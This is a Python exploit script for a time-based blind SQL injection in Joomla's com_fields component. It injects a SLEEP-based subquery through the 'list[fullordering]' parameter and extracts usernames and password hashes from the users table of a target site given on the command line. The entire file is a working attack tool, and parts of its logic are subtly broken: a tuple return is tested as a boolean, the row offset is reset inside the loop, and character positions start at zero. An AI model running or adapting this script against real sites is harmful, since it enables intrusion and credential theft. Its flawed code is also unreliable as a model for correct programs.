import requests
import sys
import time

VERBOSE_LOGGING = False

# gathered from joomla docs https://docs.joomla.org/Tables/users
users_table = "#__users"
username_max_chars = 150
password_max_chars = 100
charset = list(range(32, 127))


def print_usage():
    print("usage:\n\tpython {} http://10.10.10.10/index.php\n".format(sys.argv[0]))


def verbose_log(msg):
    print(msg) if VERBOSE_LOGGING else None


def success_log(msg):
    print('\033[92m'+msg+'\033[0m')


def fail_log(msg):
    print('\033[91m'+msg+'\033[0m')


def build_query_params(sleep_time=5, table_name="#__users", offset=0, start_position=1, char=0, operator="="):
    sqli = "(SELECT SLEEP({}) WHERE substr((SELECT CONCAT(username,0x3A,password) from {} LIMIT 1 OFFSET {}),{},1){}BINARY {} LIMIT 1)".format(
        sleep_time, table_name, offset, start_position, operator, hex(char)
    )

    return {
        "option": "com_fields",
        "view": "fields",
        "layout": "modal",
        "list[fullordering]": sqli
    }


def timed_boolean_request(url, params):
    start = time.time()
    r = requests.get(url, params=params)
    end = time.time()

    verbose_log("[-] query: {} took {} seconds to complete".format(params["list[fullordering]"], end - start))

    return True if end - start > 3 else False, r


# Performs a binary search leaving a reduced set of <=5 chars
def reduce_charset(chars, position, url):
    reduced_charset = chars

    while len(reduced_charset) > 5:
        mid_point = reduced_charset[:len(reduced_charset) // 2][-1]
        params = build_query_params(start_position=position, char=mid_point, operator=">")

        is_greater_half = timed_boolean_request(url=url, params=params)

        if is_greater_half:
            reduced_charset = reduced_charset[len(reduced_charset) // 2:]
        else:
            reduced_charset = reduced_charset[:len(reduced_charset) // 2]

    return reduced_charset


def verify_url(url):
    url = url.rstrip("/")

    if "index.php" not in url:
        url += "/index.php"

    if "http" not in url:
        url = "http://"+url

    return url


def enum(url):
    results = []
    url = verify_url(url)

    verbose_log("[-] initializing enumeration url: {}".format(url))

    while True:
        result = ""
        offset = 0

        verbose_log("[-] enumerating row #{}".format(offset))

        for position in range(username_max_chars):
            # if no chars matched the position then offset is complete
            if position > len(result):
                # if result is empty then there might not be any more rows in the db
                if result == "":
                    verbose_log("[-] no results for row #{}, assuming no more rows".format(offset))
                    return results

                results.append(result)
                offset += 1
                break

            reduced_charset = reduce_charset(charset, position, url)

            for char in reduced_charset:
                params = build_query_params(offset=offset, start_position=position, char=char)
                is_valid_char = timed_boolean_request(url=url, params=params)

                if is_valid_char:
                    success_log("[-] char ({}) found at position {} for row #{}".format(chr(char), position, offset))
                    result += chr(char)
                    break


if __name__ == "__main__":
    if len(sys.argv) < 2:
        fail_log("error: missing arguments\n")
        print_usage()
        sys.exit(1)

    vuln_host = sys.argv[1]

    try:
        findings = enum(vuln_host)
    except:
        fail_log("error: unknown error occurred")
        sys.exit(1)

    success_log("FOUND:\n")

    for finding in findings:
        success_log("\t{}".format(finding))
